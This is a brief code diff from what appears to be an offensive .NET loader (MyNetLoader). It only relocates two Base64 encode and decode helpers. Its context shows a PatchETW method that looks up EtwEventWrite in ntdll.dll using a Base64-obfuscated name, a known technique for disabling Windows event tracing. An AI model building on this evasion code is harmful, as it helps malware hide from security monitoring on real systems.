@@ -412,16 +412,6 @@ public class MyNetLoader
 
     }
 
-    private static String FromB64(String b64)
-    {
-        return Encoding.UTF8.GetString(Convert.FromBase64String(b64));
-    }
-
-    private static String ToB64(String a)
-    {
-        return Convert.ToBase64String(Encoding.UTF8.GetBytes(a));
-    }
-
     private static void PatchETW()
     {
         IntPtr pEtwEventSend = GetLibraryAddress("ntdll.dll", FromB64("RXR3RXZlbnRXcml0ZQ=="));
@@ -439,8 +429,17 @@ public class MyNetLoader
         }
 
 
+
     }
 
+    private static String FromB64(String b64)
+    {
+        return Encoding.UTF8.GetString(Convert.FromBase64String(b64));
+    }
 
+    private static String ToB64(String a)
+    {
+        return Convert.ToBase64String(Encoding.UTF8.GetBytes(a));
+    }
 
 }
